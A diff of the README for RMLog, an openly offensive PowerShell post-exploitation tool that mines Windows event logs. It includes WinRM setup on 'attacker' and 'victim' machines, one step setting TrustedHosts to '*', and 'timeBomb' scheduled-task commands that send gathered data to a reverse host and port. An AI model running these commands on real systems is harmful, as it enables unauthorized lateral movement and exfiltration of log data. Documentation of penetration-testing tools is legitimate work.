@@ -2,6 +2,21 @@
 RMLog is a post exploitation powershell script which it uses windows event logs to gather information about internal network in a pentration testing engagment. It is not only useful for blue teams but also for red teams because some of its functionalities can be used for lateral movement. You will be able to use RMLog not only on a localhost machine but also in a remote machine using WinRM protocol which is by default enabled in a newly Windows versions. 
 
 
+## Configuration
+
+In some cases may be you need to configure WinRM protocol to be functional
+
+On client side (attacker):
+
+	winrm quickconfig
+	winrm set winrm/config/client '@{TrustedHosts="*"}'
+		
+On the server side (victim):
+		
+	Enable-PSRemoting -Force
+	winrm quickconfig
+
+
 ## Usage
 
 Use can use the following event types:
@@ -16,19 +31,6 @@ Use can use the following event types:
 8) Information EventID (4688) - A new process has been created
 9) Information EventID (4776) - The domain controller attempted to validate the credentials for an account
 
-## Configuration
-
-In some cases may be you need to configure WinRM protocol to be functional
-
-On client side (attacker):
-
-	winrm quickconfig
-	winrm set winrm/config/client '@{TrustedHosts="*"}'
-		
-On the server side (victim):
-		
-	Enable-PSRemoting -Force
-	winrm quickconfig
 
 ### Examples
 
@@ -83,6 +85,7 @@ Tip2: If you want to get notifications only from users who have open RDP connect
 
 The task is going to run now.
 ```
+PS> timeBomb -task now -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
@@ -98,11 +101,18 @@ PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <P
 
 The task is going to run once at specific time.
 ```
+PS> timeBomb -task once -at 15:00 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 PS> timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
+#### Example 1 - User is logged of
+
+![alt text](https://github.com/tasox/LogRM/blob/master/timBomb_task_once.png)
+
+
 The task is going to run and stop at specific time.
 ```
+PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
